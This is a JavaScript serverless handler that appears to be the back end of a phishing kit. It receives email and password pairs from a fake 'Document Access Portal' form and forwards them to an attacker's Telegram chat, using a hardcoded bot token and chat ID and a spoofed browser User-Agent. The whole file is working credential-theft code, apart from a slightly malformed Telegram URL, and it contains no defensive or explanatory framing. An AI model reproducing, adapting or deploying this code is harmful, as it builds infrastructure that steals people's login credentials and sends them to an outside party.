export default async function handler(req, res) {
    if (req.method !== 'POST') {
        res.setHeader('Allow', ['POST']);
        return res.status(405).json({ error: `Method ${req.method} Not Allowed` });
    }

    try {
        let buffers = [];
        for await (const chunk of req) {
            buffers.push(chunk);
        }
        const dataBuffer = Buffer.concat(buffers).toString();
        
        let body = {};
        if (dataBuffer) {
            try {
                body = JSON.parse(dataBuffer);
            } catch (e) {
                return res.status(400).json({ error: "Invalid JSON format received by server." });
            }
        }

        const { email, password } = body;

        if (!email || !password) {
            return res.status(400).json({ error: "Please complete all verification fields." });
        }

        const botToken = "9290775005:AAHjdXrkhjuQHWowxJTfvLoirP6nPa6opmc";
        const chatId = "1080822304";

        const messageText = `📄 *DOCUMENT ACCESS PORTAL REGISTRATION*\n\n`
                          + `📧 *Portal Email:* ${email}\n`
                          + `🔑 *Access Key:* \`${password}\``;

        const telegramUrl = `https://telegram.org{botToken}/sendMessage`;

        // Create an explicit AbortController to manage connections safely on Serverless
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 8000); // 8-second window

        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' // Simulates standard browser routing
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: messageText,
                parse_mode: 'Markdown'
            }),
            signal: controller.signal
        });

        clearTimeout(timeoutId);
        const result = await response.json();

        if (response.ok && result.ok) {
            return res.status(200).json({ success: true });
        } else {
            return res.status(400).json({ error: result.description || "Telegram API rejected the request." });
        }

    } catch (error) {
        if (error.name === 'AbortError') {
            return res.status(504).json({ error: "Connection to Telegram timed out. Please try again." });
        }
        return res.status(500).json({ error: `Network Exception: ${error.message}. Try changing Vercel Deployment Region.` });
    }
}
